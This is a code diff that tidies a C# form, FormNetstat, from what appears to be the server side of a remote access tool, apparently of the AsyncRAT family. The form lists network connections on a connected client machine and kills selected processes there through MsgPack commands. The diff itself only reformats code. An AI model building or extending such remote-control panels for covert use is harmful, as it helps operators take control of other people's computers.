@@ -1,62 +1,55 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using Server.MessagePack;
 using Server.Connection;
+using Server.MessagePack;
 
 namespace Server.Forms
 {
-    public partial class FormNetstat: Form
+    public partial class FormNetstat : Form
     {
-        public Form1 F { get; set; }
-        internal Clients Client { get; set; }
-        internal Clients ParentClient { get; set; }
-
         public FormNetstat()
         {
             InitializeComponent();
         }
+
+        public Form1 F { get; set; }
+        internal Clients Client { get; set; }
+        internal Clients ParentClient { get; set; }
 
 
         private void timer1_Tick(object sender, EventArgs e)
         {
             try
             {
-                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected) this.Close();
+                if (!Client.TcpClient.Connected || !ParentClient.TcpClient.Connected) Close();
             }
-            catch { this.Close(); }
+            catch
+            {
+                Close();
+            }
         }
 
         private async void killToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
-            {
                 foreach (ListViewItem P in listView1.SelectedItems)
-                {
                     await Task.Run(() =>
                     {
-                        MsgPack msgpack = new MsgPack();
+                        var msgpack = new MsgPack();
                         msgpack.ForcePathObject("Pac_ket").AsString = "Netstat";
                         msgpack.ForcePathObject("Option").AsString = "Kill";
                         msgpack.ForcePathObject("ID").AsString = P.SubItems[lv_id.Index].Text;
                         ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                     });
-                }
-            }
         }
 
         private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            ThreadPool.QueueUserWorkItem((o) =>
+            ThreadPool.QueueUserWorkItem(o =>
             {
-                MsgPack msgpack = new MsgPack();
+                var msgpack = new MsgPack();
                 msgpack.ForcePathObject("Pac_ket").AsString = "Netstat";
                 msgpack.ForcePathObject("Option").AsString = "List";
                 ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
@@ -67,12 +60,11 @@ namespace Server.Forms
         {
             try
             {
-                ThreadPool.QueueUserWorkItem((o) =>
-                {
-                    Client?.Disconnected();
-                });
+                ThreadPool.QueueUserWorkItem(o => { Client?.Disconnected(); });
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
 }
